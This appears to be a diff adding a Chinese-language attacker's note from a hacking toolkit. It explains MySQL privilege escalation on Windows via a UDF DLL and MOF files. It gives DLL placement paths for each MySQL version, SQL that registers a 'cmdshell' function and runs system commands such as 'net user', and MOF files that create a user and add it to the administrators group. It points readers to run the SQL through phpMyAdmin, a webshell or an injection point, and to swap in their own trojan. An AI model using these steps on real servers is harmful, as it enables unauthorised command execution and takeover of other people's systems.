@@ -1,0 +1,50 @@
+
+使用K8飞刀把UDF.DLL 或MOF文件转换成对应导出的MYSQL语句
+在phpmyadmin或大马或直接在注入点 反正可以执行SQL语句
+把对应的mysql提权语句 放过去执行 就大功告成了...
+
+当然如果已经拿到webshell 可以直接上传udf或mof
+==============================================
+Mysql UDF.dll提权 的说明
+
+by K8拉登哥哥  20140430
+
+
+条件 root权限
+
+要能insert和delect 
+
+
+小于mysql5.1版本
+C:\\WINDOWS\\udf.dll    或    C:\\WINDOWS\\system32\\udf.dll 或 mysql的bin 目录里也行
+
+等于mysql5.1版本
+%mysql%\\plugin\\udf.dll   用 select @@plugin_dir 查询plugin路径
+默认 C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll
+
+
+非以上目录 就会报错 返回#1124
+CREATE FUNCTION exec_cmd RETURNS int SONAME 'C:\\WINDOWS\\Temp\\dll.dll';
+
+
+udf.dll  66K 有好多功能(去掉NC和开3389) 有回显 但有中文特征
+执行SQL语句 
+
+Create function cmdshell returns string soname "udf.dll";
+
+Select cmdshell("net user");
+
+Drop function cmdshell;
+
+==============================================
+
+2 mof提权 
+
+请根据需要自行修改命令 
+不只是添加用户啊 也可以改成直接运行你的马 一样道理
+
+CreateUser.mof  创建用户
+
+AddAdminGroup.mof  添加用户到管理员组  
+
+==============================================
